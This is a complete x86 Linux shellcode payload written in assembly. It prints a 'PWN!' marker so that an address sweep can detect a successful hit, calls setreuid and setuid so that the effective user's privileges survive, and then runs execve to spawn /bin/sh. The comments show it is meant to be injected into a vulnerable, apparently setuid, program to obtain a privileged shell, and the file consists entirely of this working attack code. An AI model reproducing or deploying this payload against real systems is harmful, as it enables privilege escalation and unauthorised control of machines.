BITS 32
global _start
_start:
    ; write(1, "PWN!", 4) -- marker so the address sweep can tell a hit from a crash
    xor eax, eax
    push eax
    push 0x214e5750
    mov ecx, esp
    xor ebx, ebx
    inc ebx
    xor edx, edx
    mov dl, 4
    xor eax, eax
    mov al, 4
    int 0x80
    ; euid = geteuid(); setreuid(euid,euid)
    xor eax, eax
    mov al, 201
    int 0x80
    mov ebx, eax
    mov ecx, eax
    xor eax, eax
    mov al, 70
    int 0x80
    ; setuid(euid) -- real, effective AND saved, so the privilege survives execve
    xor eax, eax
    mov al, 201
    int 0x80
    mov ebx, eax
    xor eax, eax
    mov al, 23
    int 0x80
    ; execve("/bin/sh", ["/bin/sh", NULL], NULL)
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    xor edx, edx
    mov al, 11
    int 0x80
